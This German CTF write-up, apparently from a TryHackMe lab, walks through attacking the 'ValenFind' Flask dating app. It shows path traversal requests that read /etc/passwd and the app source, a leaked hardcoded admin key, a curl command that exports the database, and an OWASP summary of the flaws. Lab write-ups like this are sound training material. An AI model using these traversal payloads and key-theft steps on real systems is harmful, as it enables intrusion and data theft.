# Valenfind – CTF Writeup

**Target:** `http://10.112.165.127:5000`  
**App:** ValenFind – Flask Dating App  
**Flag:** `THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}`

---

## Übersicht

ValenFind ist eine Flask-basierte Dating-App mit Stored XSS, Path Traversal und einer ungesicherten Admin-API. Die Flag steckt in der Datenbank im `address`-Feld des Admin-Users **cupid**.

---

## Angriffskette

### 1. Reconnaissance

- `/register` → Account erstellen (username + password)
- `/complete_profile` → Profilfelder: `real_name`, `email`, `phone`, `address`, `bio`
- `/dashboard` → Alle User sichtbar, Like-Buttons (`POST /like/{id}`)
- `/profile/{username}` → Profilansicht anderer User
- `/my_profile` → Eigenes Profil editieren

### 2. Path Traversal auf `/api/fetch_layout` (kritisch)

Die Route `/api/fetch_layout?layout=theme_classic.html` lädt Template-Dateien aus `/opt/Valenfind/templates/components/`. Der `layout`-Parameter ist **nicht sanitized** – nur `cupid.db` und `seeder.py` werden explizit geblockt.

```
GET /api/fetch_layout?layout=../../../../etc/passwd
→ root:x:0:0:root:/root:/bin/bash ...
```

**Source Code lesen:**

```
GET /api/fetch_layout?layout=../../app.py
→ Kompletter Flask-Quellcode
```

Daraus extrahiert:

```python
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
```

Und die Admin-Route:

```python
@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    if auth_header == ADMIN_API_KEY:
        return send_file(DATABASE, as_attachment=True)
```

### 3. Datenbank-Export via Admin-API

```bash
curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
     http://10.112.165.127:5000/api/admin/export_db \
     -o valenfind_leak.db
```

### 4. Flag aus der Datenbank

```sql
SELECT address FROM users WHERE username = 'cupid';
→ FLAG: THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
```

---

## Bonus-Findings

| Finding | Detail |
|---|---|
| Klartext-Passwörter | Alle Passwörter ungehasht in der DB (`cupid` → `admin_root_x99`) |
| Stored XSS | HTML in Profilfeldern wird in DB gespeichert, aber im Template escaped. Kein Bot → kein Cookie-Stealing möglich |
| JS-Injection (theoretisch) | `bio` wird in `innerHTML` via JS eingesetzt, aber Quotes sind HTML-entity-escaped (`&#34;`) |
| `redirect(request.referrer)` Bug | `POST /like/{id}` gibt `302` mit `Location: None` zurück |
| `secret_key = os.urandom(24)` | Session-Key wird bei jedem Restart neu generiert → nicht crackbar |

---

## Schwachstellen (OWASP)

| OWASP | Schwachstelle |
|---|---|
| **A01 Broken Access Control** | Admin-API-Key hardcoded im Source, Path Traversal liest beliebige Dateien |
| **A03 Injection** | Path Traversal in `/api/fetch_layout` – kein Input-Filtering |
| **A04 Insecure Design** | Klartext-Passwörter, API-Key im Source statt in Env-Variable |
| **A05 Security Misconfiguration** | Fehlermeldungen leaken Dateipfade (`/opt/Valenfind/templates/components/...`) |

---

## Scripts

| Script | Zweck |
|---|---|
| `_check_render.py` | Prüft ob HTML in Profilfeldern raw oder escaped gerendert wird |
| `_check_js_inject.py` | Testet JS-String-Breakout im `bioText`-Kontext |
| `_check_layout.py` | Path Traversal auf `/api/fetch_layout` – liest `app.py`, `/etc/passwd` |
| `_dump_db.py` | Exportiert die DB via Admin-API, extrahiert alle User + Flag |
| `valenfind_pwn.py` | All-in-one XSS-Exploit (Rabbit Hole, nicht der finale Weg) |
